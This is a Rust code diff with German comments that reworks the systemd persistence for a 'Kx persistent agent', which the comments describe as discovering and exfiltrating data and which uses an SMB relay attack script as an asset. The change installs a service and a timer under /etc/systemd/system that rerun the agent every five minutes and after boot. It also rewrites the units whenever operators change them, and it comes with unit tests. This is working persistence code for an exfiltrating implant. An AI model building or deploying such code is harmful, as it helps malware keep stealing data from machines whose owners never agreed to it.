@@ -43,41 +43,119 @@ pub fn systemd_env_content(inv: &Invocation) -> String {
 /// `${NAME}`-Platzhalter im `ExecStart` wird von systemd zur Laufzeit aus
 /// dieser Datei aufgelöst.
 ///
-/// `Restart=always` zusammen mit fehlenden Pflichtargumenten erzeugt eine
-/// Neustart-Schleife — deshalb enthält der `ExecStart` alle Argumente, die der
-/// Agent braucht.
+/// Der Agent ist ein **Einmal-Lauf**: er entdeckt, exfiltriert und endet.
+/// `Type=simple` mit `Restart=always` startet ihn deshalb sofort wieder —
+/// im Betrieb alle zwölf Sekunden. Die Unit ist darum `oneshot` ohne
+/// Neustart; den Takt gibt der Timer ([`systemd_timer_content`]).
+///
+/// `WorkingDirectory` zeigt auf das Verzeichnis des Binaries, nicht auf das
+/// Arbeitsverzeichnis des Prozesses: systemd startet den Agenten mit `/` als
+/// Arbeitsverzeichnis, ein relativer Pfad (das Asset `assets/smbrelayx.py`)
+/// löst sich dort nicht auf.
 pub fn systemd_unit_content(inv: &Invocation) -> String {
     let path = inv.binary_path.to_string_lossy();
     let env_path = systemd_env_file_path(&inv.name);
     let env_path = env_path.to_string_lossy();
     let args = inv.args.join(" ");
+    let workdir = inv
+        .binary_path
+        .parent()
+        .filter(|dir| !dir.as_os_str().is_empty())
+        .unwrap_or_else(|| Path::new("/"))
+        .to_string_lossy();
     format!(
         r#"[Unit]
 Description=Kx persistent agent ({name})
 After=network-online.target
 
 [Service]
-Type=simple
+Type=oneshot
 EnvironmentFile={env_path}
+WorkingDirectory={workdir}
 ExecStart={path} {args}
-Restart=always
-RestartSec=5
+Restart=no
 
 [Install]
-WantedBy=multi-user.target
+WantedBy={timer}
 "#,
         name = inv.name,
+        timer = systemd_timer_name(&inv.name),
     )
 }
 
-/// Installiert einen systemd-Systemdienst.
+/// Der Name der Timer-Unit zu einem Dienstnamen.
+///
+/// Der Timer ist die einzige Unit, die der Betreiber aktiviert — die
+/// Service-Unit hängt an ihm.
+pub fn systemd_timer_name(service_name: &str) -> String {
+    format!("{service_name}.timer")
+}
+
+/// Baut den Inhalt der systemd-Timer-Datei.
+///
+/// Der Timer gibt den Takt vor: er startet den Agenten alle fünf Minuten.
+/// `Persistent=true` holt einen versäumten Lauf nach, wenn der Rechner
+/// zwischenzeitlich aus war.
+///
+/// `Unit=` nennt die Service-Unit, die der Timer startet. Zusammen mit
+/// `WantedBy={name}.timer` in der Service-Unit ist die Kette vollständig:
+/// `timers.target` startet den Timer, der Timer zieht den Dienst an sich.
+pub fn systemd_timer_content(inv: &Invocation) -> String {
+    let name = &inv.name;
+    format!(
+        r#"[Unit]
+Description=Kx persistent agent timer ({name})
+After=network-online.target
+
+[Timer]
+OnBootSec=2min
+OnUnitActiveSec=5min
+Persistent=true
+Unit={name}.service
+
+[Install]
+WantedBy=timers.target
+"#
+    )
+}
+
+/// Schreibt eine Datei nur, wenn sich ihr Inhalt ändert.
+///
+/// Der Agent läuft im Fünf-Minuten-Takt und schreibt die Unit-Datei bei jedem
+/// Lauf. Ohne diese Prüfung wäre jeder Lauf ein Schreibvorgang — und jede
+/// Betreiber-Änderung an der Unit wäre im nächsten Lauf wieder weg, zusammen
+/// mit einem `daemon-reload`, den niemand braucht.
+///
+/// # Rückgabe
+/// `true`, wenn die Datei geschrieben wurde, `false`, wenn der Inhalt schon
+/// stimmte.
+#[cfg(unix)]
+fn write_if_changed(path: &Path, content: &str) -> Result<bool, PosixError> {
+    if let Ok(bestehend) = std::fs::read_to_string(path) {
+        if bestehend == content {
+            return Ok(false);
+        }
+    }
+    std::fs::write(path, content).map_err(|e| PosixError::Systemd(e.to_string()))?;
+    Ok(true)
+}
+
+/// Installiert einen systemd-Systemdienst mit Timer.
 ///
 /// # Argumente
 /// * `inv` — Dienst mit Binary-Pfad, Argumenten und Umgebungsvariablen.
 ///
-/// Schreibt zwei Dateien: die Unit-Datei (die Werte des Tokens stehen *nicht*
-/// darin) und die Environment-Datei mit restriktiven Rechten (0600 in einem
-/// Verzeichnis mit 0700).
+/// Schreibt drei Dateien: die Service-Unit (die Werte des Tokens stehen
+/// *nicht* darin), die Timer-Unit und die Environment-Datei mit restriktiven
+/// Rechten (0600 in einem Verzeichnis mit 0700).
+///
+/// Der Dienst ist ein Einmal-Lauf (`Type=oneshot`, `Restart=no`); den Takt gibt
+/// der Timer. Aktiviert wird deshalb der Timer — die Service-Unit hängt an ihm
+/// (`WantedBy={name}.timer`).
+///
+/// Jede Datei wird nur geschrieben, wenn sich ihr Inhalt ändert. Sonst
+/// überschreibt der Agent im Fünf-Minuten-Takt jede Betreiber-Änderung und
+/// löst bei jedem Lauf einen `daemon-reload` aus.
 #[cfg(unix)]
 pub async fn install_systemd_service(inv: &Invocation) -> Result<(), PosixError> {
     let unit_dir = Path::new("/etc/systemd/system");
@@ -91,25 +169,33 @@ pub async fn install_systemd_service(inv: &Invocation) -> Result<(), PosixError>
     // Dienstes nicht, schlägt systemd mit einem klaren Fehler fehl, statt
     // den Agenten mit leerem Token zu starten.
     let env_path = systemd_env_file_path(&inv.name);
-    std::fs::write(&env_path, systemd_env_content(inv))
-        .map_err(|e| PosixError::Systemd(e.to_string()))?;
+    let mut geaendert = write_if_changed(&env_path, &systemd_env_content(inv))?;
     set_mode(&env_path, 0o600)?;
 
     let unit_path = unit_dir.join(format!("{}.service", inv.name));
-    std::fs::write(&unit_path, systemd_unit_content(inv))
-        .map_err(|e| PosixError::Systemd(e.to_string()))?;
+    geaendert |= write_if_changed(&unit_path, &systemd_unit_content(inv))?;
 
-    // systemctl daemon-reload && systemctl enable
-    let out = tokio::process::Command::new("systemctl")
-        .arg("daemon-reload")
-        .output()
-        .await
-        .map_err(|e| PosixError::Systemd(e.to_string()))?;
-    if !out.status.success() {
-        let err = String::from_utf8_lossy(&out.stderr).to_string();
-        warn!("systemctl daemon-reload fehlgeschlagen: {err}");
-        return Err(PosixError::Systemd(err));
+    // Der Timer gibt den Takt vor. Ohne ihn startet die Unit nur beim Boot —
+    // mit `Type=oneshot` wäre das ein Lauf, kein Dauerlauf.
+    let timer_path = unit_dir.join(systemd_timer_name(&inv.name));
+    geaendert |= write_if_changed(&timer_path, &systemd_timer_content(inv))?;
+
+    // systemctl daemon-reload — nur wenn sich wirklich etwas geändert hat.
+    if geaendert {
+        let out = tokio::process::Command::new("systemctl")
+            .arg("daemon-reload")
+            .output()
+            .await
+            .map_err(|e| PosixError::Systemd(e.to_string()))?;
+        if !out.status.success() {
+            let err = String::from_utf8_lossy(&out.stderr).to_string();
+            warn!("systemctl daemon-reload fehlgeschlagen: {err}");
+            return Err(PosixError::Systemd(err));
+        }
     }
+
+    // Der Dienst hängt am Timer: `systemctl enable kx-agent` legt die
+    // Verknüpfung `kx-agent.timer.wants/kx-agent.service` an.
     let out = tokio::process::Command::new("systemctl")
         .args(["enable", &inv.name])
         .output()
@@ -119,8 +205,21 @@ pub async fn install_systemd_service(inv: &Invocation) -> Result<(), PosixError>
         let err = String::from_utf8_lossy(&out.stderr).to_string();
         return Err(PosixError::Systemd(err));
     }
+
+    // Der Timer wird aktiviert und gestartet. Er startet die Service-Unit
+    // alle fünf Minuten — einmalig `Type=oneshot`, ohne Neustart.
+    let timer = systemd_timer_name(&inv.name);
+    let out = tokio::process::Command::new("systemctl")
+        .args(["enable", "--now", &timer])
+        .output()
+        .await
+        .map_err(|e| PosixError::Systemd(e.to_string()))?;
+    if !out.status.success() {
+        let err = String::from_utf8_lossy(&out.stderr).to_string();
+        return Err(PosixError::Systemd(err));
+    }
     debug!(
-        "systemd-Dienst {name} installiert und aktiviert",
+        "systemd-Dienst {name} mit Timer {timer} installiert und aktiviert",
         name = inv.name
     );
     Ok(())
@@ -293,5 +392,110 @@ mod tests {
         let path = systemd_env_file_path("kx-agent");
         assert!(path.starts_with("/etc/kx/"));
         assert!(!path.starts_with("/etc/systemd/system/"));
+    }
+
+    /// Die Unit ist ein Einmal-Lauf ohne Neustart.
+    ///
+    /// `Restart=always` mit `Type=simple` war die Endlosschleife: der Agent
+    /// endet nach jedem Lauf, systemd startet ihn sofort wieder — im Betrieb
+    /// alle zwölf Sekunden. Der Takt kommt jetzt vom Timer.
+    #[test]
+    fn unit_ist_ein_einmal_lauf_ohne_neustart() {
+        let unit = systemd_unit_content(&sample_invocation());
+        assert!(
+            unit.contains("Type=oneshot"),
+            "die Unit ist kein Einmal-Lauf: {unit}"
+        );
+        assert!(
+            !unit.contains("Restart=always"),
+            "die Unit startet den Agenten wieder von vorn: {unit}"
+        );
+        assert!(
+            unit.contains("Restart=no"),
+            "die Unit verbietet den Neustart nicht ausdrücklich: {unit}"
+        );
+    }
+
+    /// Die Unit nennt das Verzeichnis des Binaries als Arbeitsverzeichnis.
+    ///
+    /// systemd startet den Agenten mit `/` als Arbeitsverzeichnis. Ein
+    /// relativer Pfad — das Asset `assets/smbrelayx.py` — löst sich dort
+    /// nicht auf.
+    #[test]
+    fn unit_setzt_das_arbeitsverzeichnis_auf_das_binary_verzeichnis() {
+        let unit = systemd_unit_content(&sample_invocation());
+        assert!(
+            unit.contains("WorkingDirectory=/usr/local/bin"),
+            "die Unit setzt kein Arbeitsverzeichnis: {unit}"
+        );
+    }
+
+    /// Der Timer gibt den Takt vor und zehlt auf die Service-Unit.
+    ///
+    /// `OnUnitActiveSec=5min` ist der Takt, `Persistent=true` holt einen
+    /// versäumten Lauf nach, `Unit=` nennt die Unit, die der Timer startet.
+    #[test]
+    fn timer_gibt_den_takt_vor() {
+        let timer = systemd_timer_content(&sample_invocation());
+        assert!(
+            timer.contains("OnBootSec=2min"),
+            "der Timer startet nicht nach dem Boot: {timer}"
+        );
+        assert!(
+            timer.contains("OnUnitActiveSec=5min"),
+            "der Timer taktet nicht im Fünf-Minuten-Raster: {timer}"
+        );
+        assert!(
+            timer.contains("Persistent=true"),
+            "der Timer holt keinen versäumten Lauf nach: {timer}"
+        );
+        assert!(
+            timer.contains("Unit=kx-agent.service"),
+            "der Timer nennt die Service-Unit nicht: {timer}"
+        );
+        assert!(
+            timer.contains("WantedBy=timers.target"),
+            "der Timer hängt nicht an timers.target: {timer}"
+        );
+    }
+
+    /// Die Service-Unit hängt am Timer.
+    ///
+    /// Nur so startet der Timer die Service-Unit — ein Timer ohne diese
+    /// Verknüpfung läuft ins Leere.
+    #[test]
+    fn die_service_unit_haengt_am_timer() {
+        let unit = systemd_unit_content(&sample_invocation());
+        assert!(
+            unit.contains("WantedBy=kx-agent.timer"),
+            "die Service-Unit hängt nicht am Timer: {unit}"
+        );
+    }
+
+    /// Eine Datei wird nur geschrieben, wenn sich ihr Inhalt ändert.
+    ///
+    /// Der Agent läuft im Fünf-Minuten-Takt. Ohne diese Prüfung wäre jeder
+    /// Lauf ein Schreibvorgang — und eine Betreiber-Änderung an der Unit
+    /// wäre im nächsten Lauf wieder weg.
+    #[cfg(unix)]
+    #[test]
+    fn eine_datei_wird_nur_bei_abweichung_geschrieben() {
+        let dir = std::env::temp_dir().join(format!("kx-persist-test-{}", std::process::id()));
+        std::fs::create_dir_all(&dir).expect("Testverzeichnis");
+        let pfad = dir.join("unit.txt");
+
+        // Der erste Lauf schreibt.
+        assert!(write_if_changed(&pfad, "inhalt A").expect("Schreiben"));
+        assert_eq!(std::fs::read_to_string(&pfad).unwrap(), "inhalt A");
+
+        // Der zweite Lauf mit demselben Inhalt schreibt nicht.
+        assert!(!write_if_changed(&pfad, "inhalt A").expect("Schreiben"));
+        assert_eq!(std::fs::read_to_string(&pfad).unwrap(), "inhalt A");
+
+        // Geänderter Inhalt wird geschrieben.
+        assert!(write_if_changed(&pfad, "inhalt B").expect("Schreiben"));
+        assert_eq!(std::fs::read_to_string(&pfad).unwrap(), "inhalt B");
+
+        std::fs::remove_dir_all(&dir).ok();
     }
 }
